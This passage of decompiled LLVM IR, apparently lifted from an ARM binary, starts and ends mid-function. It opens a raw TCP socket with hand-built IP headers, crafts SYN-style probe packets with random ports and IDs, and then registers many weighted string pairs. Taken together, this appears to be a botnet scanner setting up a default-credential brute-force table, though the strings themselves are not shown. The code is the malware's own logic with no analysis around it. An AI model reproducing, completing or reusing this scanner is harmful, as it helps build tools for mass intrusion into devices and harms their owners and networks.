  store i32 %v0_10030, i32* @global_var_2295c.90, align 4
  %v1_1003c = call i32 @function_f5cc(i32 %v0_10030)
  %v0_10040 = load i32, i32* @r4, align 4
  store i32 %v0_10040, i32* %r0.global-to-local, align 4
  %v1_10044 = inttoptr i32 %v0_10040 to i32*
  %v2_10044 = call i32 @function_15b1c(i32* %v1_10044)
  store i32 ptrtoint (i32* @global_var_223e8.194 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_10044, i32* @global_var_223e8.194, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_10058 = call i32 @function_13258(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_22978.205 to i32), i32* %r3.global-to-local, align 4
  %v0_10060 = load i32, i32* @r4, align 4
  store i32 %v0_10060, i32* %stack_var_-52, align 4
  store i32 %v2_10058, i32* @global_var_22978.205, align 4
  store i32 %v0_10060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge, %dec_label_pc_10030
  %v2_10078 = phi i32 [ %v2_10078.pre, %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge ], [ %v2_10058, %dec_label_pc_10030 ]
  %v0_10080 = phi i32 [ %v0_100b0, %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge ], [ %v0_10060, %dec_label_pc_10030 ]
  %v3_10074 = mul i32 %v0_10080, 256
  store i32 %v3_10074, i32* %ip.global-to-local, align 4
  store i32 %v2_10078, i32* @lr, align 4
  %v2_10088 = mul i32 %v0_10080, 288
  %v1_10090 = add i32 %v0_10080, 1
  store i32 %v1_10090, i32* %r0.global-to-local, align 4
  %v2_10094 = add i32 %v2_10088, %v2_10078
  store i32 %v2_10094, i32* %r2.global-to-local, align 4
  store i32 %v2_10094, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_100a8 = add i32 %v2_10094, 4
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  store i32 -1, i32* %v3_100a8, align 4
  %v0_100ac = load i32, i32* @r5, align 4
  %v1_100ac = load i32, i32* %r1.global-to-local, align 4
  %v2_100ac = add i32 %v1_100ac, 12
  %v3_100ac = inttoptr i32 %v2_100ac to i32*
  store i32 %v0_100ac, i32* %v3_100ac, align 4
  %v0_100b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100b0, i32* %stack_var_-52, align 4
  %v7_100b4 = icmp sgt i32 %v1_10090, 255
  br i1 %v7_100b4, label %dec_label_pc_100b8, label %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge

dec_label_pc_1006c.dec_label_pc_1006c_crit_edge:  ; preds = %dec_label_pc_1006c
  %v2_10078.pre = load i32, i32* @global_var_22978.205, align 4
  br label %dec_label_pc_1006c

dec_label_pc_100b8:                               ; preds = %dec_label_pc_1006c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_100c4 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_100c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2297c.207 to i32), i32* %r2.global-to-local, align 4
  %v2_100cc = icmp eq i32 %v3_100c4, -1
  store i1 %v2_100cc, i1* %cpsr_c.global-to-local, align 1
  %v7_100cc = icmp eq i32 %v3_100c4, -1
  store i1 %v7_100cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_100c4, i32* @r4, align 4
  store i32 %v3_100c4, i32* @global_var_2297c.207, align 4
  br i1 %v7_100cc, label %dec_label_pc_10a3c, label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100b8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_100e0 = load i32, i32* @r5, align 4
  store i32 %v0_100e0, i32* %r2.global-to-local, align 4
  %v3_100e4 = call i32 @function_12fb4(i32 %v3_100c4, i32 3, i32 %v0_100e0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_100ec = or i32 %v3_100e4, 2048
  store i32 %v1_100ec, i32* %r2.global-to-local, align 4
  %v0_100f0 = load i32, i32* @r4, align 4
  store i32 %v0_100f0, i32* %r0.global-to-local, align 4
  %v3_100f4 = call i32 @function_12fb4(i32 %v0_100f0, i32 4, i32 %v1_100ec)
  %v2_100fc = load i32, i32* @global_var_2297c.207, align 4
  store i32 %v2_100fc, i32* @r0, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_10108 = load i32, i32* @r5, align 4
  store i32 %v0_10108, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v2_10110 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10110, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_10120 = call i32 @function_14b30(i32 %v2_100fc, i32 %v0_10108, i32 3, i32 %v2_10110, i32 4)
  store i32 %v5_10120, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10124 = icmp eq i32 %v5_10120, 0
  store i1 %v2_10124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10124, label %dec_label_pc_1012c, label %dec_label_pc_10a30

dec_label_pc_1012c:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_1012c
  %v0_1012c = call i32 @function_f570()
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_10134 = urem i32 %v0_1012c, 65536
  %v4_10134 = trunc i32 %v0_1012c to i16
  store i32 %v3_10134, i32* %r0.global-to-local, align 4
  %v2_1013c = call i32 @function_14a40(i32 %v0_1012c)
  store i32 %v2_1013c, i32* %r0.global-to-local, align 4
  %v2_10140 = icmp ugt i32 %v2_1013c, 1023
  store i1 %v2_10140, i1* %cpsr_c.global-to-local, align 1
  %v7_10140 = icmp eq i32 %v2_1013c, 1024
  store i1 %v7_10140, i1* %cpsr_z.global-to-local, align 1
  %v3_10144 = icmp ult i32 %v2_1013c, 1022
  br i1 %v3_10144, label %dec_label_pc_1012c, label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_1012c
  %v2_1014c = load i8, i8* bitcast (i8** @global_var_223b8.209 to i8*), align 4
  %v3_1014c = zext i8 %v2_1014c to i32
  %v1_10150 = and i32 %v3_1014c, 240
  %v1_10154 = or i32 %v1_10150, 5
  store i32 %v1_10154, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_223b8.209 to i8*), align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_10170 = call i32 @function_14898(i32 40)
  %v2_10170 = trunc i32 %v1_10170 to i16
  store i32 %v1_10170, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %r1.global-to-local, align 4
  store i16 %v2_10170, i16* bitcast (i32* @global_var_223ba.210 to i16*), align 4
  %v0_1017c = call i32 @function_f570()
  %v1_1017c = trunc i32 %v0_1017c to i16
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %r2.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i16 %v1_1017c, i16* bitcast (i32* @global_var_223bc.211 to i16*), align 4
  store i8 64, i8* bitcast (i32* @global_var_223c0.212 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_223c1.213 to i8*), align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1019c = call i32 @function_14898(i32 23)
  %v2_1019c = trunc i32 %v1_1019c to i16
  store i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32* %ip.global-to-local, align 4
  %v3_101a4 = load i8, i8* @global_var_223d8.216, align 1
  %tmp = urem i8 %v3_101a4, 16
  %v1_101a8 = zext i8 %tmp to i32
  %v1_101ac = or i32 %v1_101a8, 80
  store i32 %v1_101ac, i32* %r3.global-to-local, align 4
  %v1_101b0 = trunc i32 %v1_101ac to i8
  store i8 %v1_101b0, i8* @global_var_223d8.216, align 1
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* @lr, align 4
  store i16 %v2_1019c, i16* @global_var_223ce.217, align 2
  store i32 %v0_1012c, i32* %r0.global-to-local, align 4
  store i16 %v4_10134, i16* bitcast (i32* @global_var_223cc.215 to i16*), align 4
  %v0_101c4 = call i32 @function_f570()
  %v1_101c4 = trunc i32 %v0_101c4 to i16
  %v3_101cc = load i8, i8* @global_var_223d9.218, align 1
  %v4_101cc = zext i8 %v3_101cc to i32
  store i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32* %ip.global-to-local, align 4
  %v1_101d4 = or i32 %v4_101cc, 2
  store i32 %v1_101d4, i32* %r3.global-to-local, align 4
  store i16 %v1_101c4, i16* bitcast (i32* @global_var_223da.219 to i16*), align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v1_101e0 = trunc i32 %v1_101d4 to i8
  store i8 %v1_101e0, i8* @global_var_223d9.218, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  %v4_101ec = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_101fc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198bc.227 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1020c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_198bc.227 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_198c4.229 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_1021c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_198c4.229 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_1022c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r1.global-to-local, align 4
  %v5_1023c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198cc.231 to i32), i32* %r1.global-to-local, align 4
  %v0_10248 = load i32, i32* @r4, align 4
  store i32 %v0_10248, i32* %r2.global-to-local, align 4
  %v4_1024c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_198cc.231 to i32), i32 %v0_10248)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_198d4.233 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1025c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([8 x i8]* @global_var_198d4.233 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_198dc.235 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1026c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_198dc.235 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1027c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198f0.239 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1028c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_198f0.239 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_198f8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_1029c = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_198f8.241 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r1.global-to-local, align 4
  %v5_102ac = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_102bc = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.245 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102cc = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 ptrtoint (i32* @global_var_19908.245 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_102dc = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_102ec = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19910.247 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_102fc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([9 x i8]* @global_var_19910.247 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r1.global-to-local, align 4
  %v5_1030c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1031c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1032c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32* %r1.global-to-local, align 4
  %v5_1033c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32* %r1.global-to-local, align 4
  %v0_10348 = load i32, i32* @r4, align 4
  store i32 %v0_10348, i32* %r2.global-to-local, align 4
  %v4_1034c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32 %v0_10348)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1992c.253 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1035c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_1992c.253 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199d0.255 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1036c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_199d0.255 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19938.257 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_1037c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([9 x i8]* @global_var_19938.257 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199d0.255 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1038c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_199d0.255 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19944.259 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1039c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19944.259 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19910.247 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_103ac = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_19910.247 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.245 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_103bc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19908.245 to i32), i32 4)
  store i32 ptrtoint ([14 x i8]* @global_var_1994c.261 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_103cc = call i32 @function_fe88(i32 ptrtoint ([14 x i8]* @global_var_1994c.261 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1995c.263 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_103dc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([8 x i8]* @global_var_1995c.263 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_103ec = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32* %r1.global-to-local, align 4
  %v5_103fc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1040c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32* %r1.global-to-local, align 4
  %v0_10418 = load i32, i32* @r4, align 4
  store i32 %v0_10418, i32* %r2.global-to-local, align 4
  %v4_1041c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32 %v0_10418)
  store i32 ptrtoint ([5 x i8]* @global_var_1996c.267 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1996c.267 to i32), i32* %r1.global-to-local, align 4
  %v5_1042c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_1996c.267 to i32), i32 ptrtoint ([5 x i8]* @global_var_1996c.267 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19974.269 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1043c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19974.269 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19974.269 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1044c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_19974.269 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19980.271 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1045c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19980.271 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19988.273 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1046c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19988.273 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19990.275 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_1047c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_19990.275 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19998.277 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1048c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19998.277 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199a0.279 to i32), i32* %r1.global-to-local, align 4
  %v0_10498 = load i32, i32* @r4, align 4
  store i32 %v0_10498, i32* %r2.global-to-local, align 4
  %v4_1049c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_199a0.279 to i32), i32 %v0_10498)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.245 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_104ac = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_19908.245 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_104bc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_1991c.249 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_104cc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_198e8.237 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199a8.281 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
